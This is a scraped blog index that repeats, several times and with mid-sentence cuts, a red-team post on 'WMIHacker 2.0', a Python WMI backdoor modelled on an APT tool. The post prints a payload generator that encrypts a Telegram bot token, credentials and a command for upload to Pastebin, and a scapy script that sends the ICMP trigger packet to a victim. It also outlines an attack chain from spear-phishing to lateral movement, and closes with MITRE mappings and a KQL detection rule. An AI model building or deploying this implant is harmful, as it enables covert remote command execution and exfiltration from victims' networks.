specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Technique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Service Execution T1035 Backdoor installed as a system service Masquerading T1036 Avoiding detection by using expected files/names Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Technique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Masquerading T1036 Avoiding detection by using expected files/names Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Technique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Masquerading T1036 Avoiding detection by using expected files/names Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes To detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = 